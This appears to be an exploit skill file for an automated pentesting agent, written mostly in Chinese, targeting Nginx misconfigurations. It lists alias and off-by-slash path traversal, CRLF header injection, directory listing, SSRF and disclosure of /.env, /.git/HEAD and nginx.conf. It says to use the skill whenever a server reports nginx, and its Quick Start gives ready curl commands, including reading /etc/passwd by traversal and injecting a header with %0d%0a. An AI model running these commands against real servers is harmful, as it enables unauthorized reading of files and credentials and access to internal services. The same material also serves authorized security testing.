---
name: nginx-misconfiguration
description: Exploits common Nginx configuration flaws including alias path traversal, off-by-slash proxy traversal, CRLF header injection, directory listing (autoindex), and sensitive file disclosure.
skill_type: exploit
severity: high
tags: [nginx, misconfiguration, path-traversal, crlf-injection, ssrf, information-disclosure]
---

# Nginx 配置漏洞利用

## Essential Principles

1. **alias 路径穿越**: `location /files { alias /data/; }` -- location 末尾无 `/` 时，`/files../etc/passwd` 可穿越读取
2. **off-by-slash**: `location /api { proxy_pass http://backend/; }` -- `/api../secret` 导致后端路径穿越
3. **CRLF 注入**: URL 中注入 `%0d%0a` 可在响应头中插入任意内容（return/rewrite 中未过滤 `$uri`）
4. **目录遍历**: `autoindex on` 导致目录列表泄露
5. **敏感文件**: `/nginx.conf`, `/.git/HEAD`, `/.env` 等路径泄露配置和凭据
6. **反向代理 SSRF**: `proxy_pass` 参数拼接时，可请求内网服务

## When to Use

- HTTP 响应头包含 `Server: nginx` 或 `Server: openresty`
- 需要从 Web 服务获取敏感信息或执行 SSRF
- 发现异常 URL 路由行为（如 `/files/` 返回文件列表）

## When NOT to Use

- Nginx 版本最新且遵循配置安全最佳实践
- 所有敏感路径均已限制访问
- `autoindex off` 且 `return/rewrite` 中无用户可控变量

## Path Selection

| Condition | Path | Description |
|-----------|------|-------------|
| nginx_confirmed | alias_traversal | alias 路径穿越读取任意文件 |
| nginx_confirmed | proxy_traversal | off-by-slash 反向代理穿越 |
| nginx_confirmed | crlf_injection | CRLF Header 注入 |
| nginx_confirmed + sensitive_paths_found | info_disclosure | 敏感信息泄露读取 |

## Quick Start

```bash
# 确认 Nginx
curl -s -D - http://TARGET/ | head -1

# alias 穿越
curl http://TARGET/files../etc/passwd

# 目录遍历
curl http://TARGET/uploads/

# CRLF 注入
curl -s -D - http://TARGET/%0d%0aX-Injected:true
```
